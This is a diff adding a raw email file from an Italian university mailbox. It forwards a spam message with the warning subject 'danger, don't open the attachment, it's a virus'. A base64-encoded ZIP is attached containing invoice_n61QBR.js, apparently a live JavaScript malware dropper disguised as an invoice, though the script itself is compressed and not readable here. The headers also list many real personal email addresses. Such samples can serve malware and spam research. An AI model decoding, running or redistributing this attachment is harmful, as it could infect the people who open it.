@@ -1,0 +1,171 @@
+X-Account-Key: account2
+X-UIDL: 50ab8dc500071207
+X-Mozilla-Status: 1005
+X-Mozilla-Status2: 00000000
+X-Mozilla-Keys:                                                                                 
+Return-Path: <n.perrotta@libero.it>
+X-Original-To: ianni@mat.unical.it
+Delivered-To: ianni@mat.unical.it
+Received: from localhost (ml [127.0.0.1])
+	by ml.mat.unical.it (Postfix) with ESMTP id DB4E218D0140
+	for <ianni@mat.unical.it>; Thu,  4 Feb 2016 13:41:59 +0100 (CET)
+X-Virus-Scanned: Debian amavisd-new at mat.unical.it
+X-Spam-Flag: NO
+X-Spam-Score: -1.998
+X-Spam-Level: 
+X-Spam-Status: No, score=-1.998 required=2.1 tests=[BAYES_00=-1.9,
+	DKIM_SIGNED=0.1, DKIM_VALID=-0.1, DKIM_VALID_AU=-0.1,
+	FREEMAIL_FROM=0.001, HTML_MESSAGE=0.001, RCVD_IN_DNSWL_NONE=-0.0001]
+	autolearn=ham
+Authentication-Results: ml.mat.unical.it (amavisd-new); dkim=pass
+	header.i=@libero.it
+Received: from ml.mat.unical.it ([127.0.0.1])
+	by localhost (ml.mat.unical.it [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id WxXvDZ6JnK-4 for <ianni@mat.unical.it>;
+	Thu,  4 Feb 2016 13:41:57 +0100 (CET)
+Received: from libero.it (smtp-31-i6.italiaonline.it [212.48.14.165])
+	by ml.mat.unical.it (Postfix) with ESMTP id 2F32718D0102
+	for <ianni@mat.unical.it>; Thu,  4 Feb 2016 13:41:56 +0100 (CET)
+Received: from webmail-23 ([10.255.25.127])
+	by smtp-31.iol.local with bizsmtp
+	id EChv1s00j2kYG8i0XChvNZ; Thu, 04 Feb 2016 13:41:55 +0100
+x-libjamoibt: 1601
+X-CNFS-Analysis: v=2.1 cv=B9NEq7ZM c=1 sm=1 tr=0 p=w5c9wahwDWty0iXumT4A:9
+ a=Obhw9Aiuj+xviy+dzEi3bw==:117 a=L9H7d07YOLsA:10 a=9cW_t1CCXrUA:10
+ a=s5jvgZ67dGcA:10 a=7ZBCOY0EZ58A:10 a=EQV7mSM6bnsA:10 a=RkTgRSPT5bAA:10
+ a=gATXjQq3AAAA:8 a=pGLkceISAAAA:8 a=69EAbJreAAAA:8 a=0zzHN8EgpeDF8myGS6AA:9
+ a=QEXdDO2ut3YA:10 a=IKIoO-ieCDEA:10
+Message-ID: <2040964085.6227821454589715777.JavaMail.httpd@webmail-23>
+Date: Thu, 4 Feb 2016 13:41:55 +0100 (CET)
+From: "n.perrotta@libero.it" <n.perrotta@libero.it>
+Reply-To: "n.perrotta@libero.it" <n.perrotta@libero.it>
+To: ianni@mat.unical.it
+Subject: =?UTF-8?Q?pericolo!!_non_aprire_l'allegato_=C3=A8_un_virus?=
+MIME-Version: 1.0
+Content-Type: multipart/mixed; 
+	boundary="----=_Part_713342_1584814013.1454589715739"
+X-SenderIP: 160.97.25.67
+X-libjamv: 21G4bWTd+Qs=
+X-libjamsun: mLhaVQ+DmTPRQKfvVmEKYCOSWPAUFnX2
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=libero.it; s=s2014;
+	t=1454589715; bh=KSTM8b1XJepoVDtJbCJ00pan6nB1rzQs8ezIQcK/mi0=;
+	h=Date:From:Reply-To:To:Subject;
+	b=JPmfJHZD8j3yxifpLOb/rQuLGFWrbTdYYaUbfPyjtlwpAVwUUbLLkl/jY/jwBxTbV
+	 XnNNEVJacAihCEhO6nya4q3brN/xCIIOl2yRLdG6G5wy1LhrIAqTBKF97PHHw5255O
+	 SMLE08N7Evnbl8XwBHms3kgA80GKKddyytHWPNqKA/DKcawW+UKIkJJfHoQGz7gpzd
+	 g4awuDc8WklpAN4KO+jAQW8pPHaYK101NTC5rku6KydPTHaGUrJvy+bfzBmS+XtoFz
+	 hzEvFF88BLDxuhh4i7ibjAUzGOmY4gAqlYkISYyGX/v1yvjXQ78brwjR8mBxdWTZAI
+	 B8YHPlPrYVMSw==
+Content-Length: 4865
+Status:  O
+
+------=_Part_713342_1584814013.1454589715739
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_713343_729442750.1454589715739"
+
+------=_Part_713343_729442750.1454589715739
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+
+
+
+
+
+----Messaggio originale----
+
+Da: tot2 <tot2@ccraftal.com>
+
+Data: 24/01/2016 7.23
+
+A: "criscigm"<criscigm@gmail.com>, "oliverio"<oliverio@unical.it>, "bru ny =
+88"<bru_ny_88@hotmail.it>, "m giangrande"<m.giangrande@gmx.de>, "danielalar=
+osa"<danielalarosa@gmx.de>, "salfi"<salfi@hotmail.com>, "daprile"<daprile@u=
+nical.it>, "master"<master@mrk.it>, "help borse cr"<help.borse.cr@unical.it=
+>, "dir cresid"<dir.cresid@unical.it>, "caterina francomano"<caterina_franc=
+omano@yahoo.it>, "manna"<manna@mat.unical.it>, "angelo spo2007"<angelo.spo2=
+007@libero.it>, "agonfievele"<agonfievele@hotmail.it>, "istanzefermi"<istan=
+zefermi@equitaliasud.it>, "luzziluigi"<luzziluigi@libero.it>, "gquaresima"<=
+gquaresima@gmail.com>, "n perrotta"<n.perrotta@libero.it>
+
+Ogg: 1/24/2016 6:23:33 PM
+
+
+
+=EF=BB=BF
+
+
+
+ DATE:1/24/2016 6:23:33 PM
+
+
+
+
+
+------=_Part_713343_729442750.1454589715739
+Content-Type: text/html;charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+<div></div><br>
+<br>
+<blockquote>
+----Messaggio originale----<br>
+Da: tot2 &lt;tot2@ccraftal.com&gt;<br>
+Data: 24/01/2016 7.23<br>
+A: "criscigm"&lt;criscigm@gmail.com&gt;, "oliverio"&lt;oliverio@unical.it&g=
+t;, "bru ny 88"&lt;bru_ny_88@hotmail.it&gt;, "m giangrande"&lt;m.giangrande=
+@gmx.de&gt;, "danielalarosa"&lt;danielalarosa@gmx.de&gt;, "salfi"&lt;salfi@=
+hotmail.com&gt;, "daprile"&lt;daprile@unical.it&gt;, "master"&lt;master@mrk=
+.it&gt;, "help borse cr"&lt;help.borse.cr@unical.it&gt;, "dir cresid"&lt;di=
+r.cresid@unical.it&gt;, "caterina francomano"&lt;caterina_francomano@yahoo.=
+it&gt;, "manna"&lt;manna@mat.unical.it&gt;, "angelo spo2007"&lt;angelo.spo2=
+007@libero.it&gt;, "agonfievele"&lt;agonfievele@hotmail.it&gt;, "istanzefer=
+mi"&lt;istanzefermi@equitaliasud.it&gt;, "luzziluigi"&lt;luzziluigi@libero.=
+it&gt;, "gquaresima"&lt;gquaresima@gmail.com&gt;, "n perrotta"&lt;n.perrott=
+a@libero.it&gt;<br>
+Ogg: 1/24/2016 6:23:33 PM<br>
+<br>
+=EF=BB=BF<!----><br><br><br><br> DATE:1/24/2016 6:23:33 PM
+<br>
+</blockquote><br>
+
+------=_Part_713343_729442750.1454589715739--
+
+------=_Part_713342_1584814013.1454589715739
+Content-Type: APPLICATION/ZIP; name=QrS.zip
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=QrS.zip; size=2346
+
+UEsDBBQACAAIAMOiQkgAAAAAAAAAAAAAAAARAAAAaW52b2ljZV9uNjFRQlIuanOtWGtX2kgY/t5z
++h9mOWfbcLAIAS220nNAUVHBCwpWezlDMiGRmKTJBIQu/33fNzcmELrudvMhkcx7ed7bMxMn1CUq
+U2yVkTrRfEvhhm0RyaHKmKk37Jnnyc/XrwhcE5BUDEdnLqnnZse1K7t62zptTu3bXbWa+/j61VKs
+ST22WwWDkSqqfx+zWY+7H0iu0Tw4bB0dn7RPz8473YvLq+vezW1/cPf5ng4VlWkj3Xgcm0+W7fxw
+Pe5Pps+zeaksV6o7u+9re4Xtem4rdoaGQ/QfBPCG5fhL3CiDF+K3fQ5LACyHgMP34T2ITnfLW0TR
+XTm4VzJEmKWACNxBBO6V4F7NEDTASQnep70EyGAleBZd5phUYdL2w7fGu3v6bl56t/el8GX7S/3r
+9mgLMObXDEx1w2REMsh+ZMNk1ojrQZHSrjAsRAveuG54xSj/RcNS2fOFJoUQFJ26DS4ZhUIenYkZ
+iQzIv2ug8rsGsJFeHsJ6EFBQzIIUZGN/n8h58lfwSyafPpFqVtzYA6iCOjJ5Q8o7eQKa1Vizgpry
+Bk0MONCsgGYlUNxFRbCFnbIOMOnK6I8CgUExrFFRc+2nA6jQAYynhGGsNwRWydCCcCrkjzrZBYw/
+112g2IvdZAa2WDca+a3+X34rWQkFv2nPay+SuELaKX73uVb7HtKCFC6u581l3HetKCepqiyAXTBd
+eImmRIYBD1zkxlA65BgvqB30QCbHxLwQa+Az4B5QCIYV+i2LOYTBj5wXfzn6CliJBXHIsYVw0Ncz
+gQiwkgpwSlmubWyfKK5CPbs7s2oXmC4UMoglo5uY6bEACCD5RMp75Tx58yaEJcvV/EZcQcKyQiUF
+EgwMoli9fh2MBBBgdAEBDH0wu1JAA7uVTJZE4waBxMj/ItINQ/qfolGQcjakIHOYEfFLUhDxXjmk
+zCQJQlqQ4/4pLasbKXpfm+KVjojmMwQppDUSW8CrcExxeHAWIQPR/EeTLxxhUsLhGeY82DdBKfwZ
+DVPkCG26zPPN1FFBs10i4VI4w/DYDzzHugR3UZF8IxMbJgZBF1OjSb7FaMTX5M/obQg56cAoE1Gi
+Ql+AHzMjxQc5CfAkhzeN4uHO94yjGsQtl0ofkyX6ZCh0aDKu7sBSlMC3ucvRqZd7m1/KOdTzGG8/
+pYQO99TOqF5PC7q2w1w+a/V7ouy5fj1sT+9b7YF3f6a3Dy+uVvTYyGUjBDm/GIqK3eb16OSgc8ye
+SyeHj7X3jcHntEPqq1RBRXvnXlS8aHQrR71SWvjJ9i3OhtQat7QDUfrssXvWbezcp2IZMs9gI6aP
+J6LoXbO7d3JYuz5YDcFiz753fpeC35+dNrqNlVg1kxqu2kWmltnOMsma60OhtFl/fAhLD8tytG66
+nXb/dsiM0uRc9xptczwYNEtyr9ds9ue2fX/nnFzdNC8aIaStDM3HduG0WVU65rg70KuTu17n7Pax
+6571SvTquHTcM1vNdlhL8nWJSKGWbT12TYCzI1flWm255FDTNFT9BJM+6Cmu4fDigcsoZxfDR6Zw
+yVl2gtBIlHOD+yo7vMTwMxXFVhA0uc+ZSUfMmm/UTPVCYZmF/jSoAOwLqQYQjCu2pdhPBqcWt/U5
+IEvCK7aeHWqpLWtiuLb1xCzeC/Z5T1q2h2BI911uMpWego0VowWSpLNA4mZZJhSkPaa4kMCRNgVt
+jcK+GC4nBAQ5xdzCl9r88x7IlD6S9Kt9IjRRwk8pmYCrkoMOd2cRUyA544VEN6EK4Lg8wxO4YPAh
+ZSjqk1CLEKGyReAASxK4ZWtpcSsMLEpZlrLHLFVaWcdziujA45T7HqljmhJyizkvNorP9fjiVaGf
+QrwrLrPk+MzBz+VyWJZYIn6KFqeuwVkKMhC1gyVu2upsgyuMUjTiGXMGR6KYL7Lii32nKpOuWtwG
+Sc1jnfgpunRszwj+E4DN9SINj07YjX0En6dS0vxb+I20UXu107nrR40eI4qfizUbC6IZFlDPatfG
+GmIsiml7bLWTUDBtdvlrARPKFR0+s0eW7TIVEh4uhvfgsCxOqViQhDAe4r3yq7RGAB3K9aJjTyX4
+L0J5D3b0IL7Fq0UeYP4NUEsHCIwMvzocBgAAkhEAAFBLAQItAxQACAAIAMOiQkiMDL86HAYAAJIR
+AAARAAAAAAAAAAAAIACkgQAAAABpbnZvaWNlX242MVFCUi5qc1BLBQYAAAAAAQABAD8AAABbBgAA
+AAA=
+------=_Part_713342_1584814013.1454589715739--
+
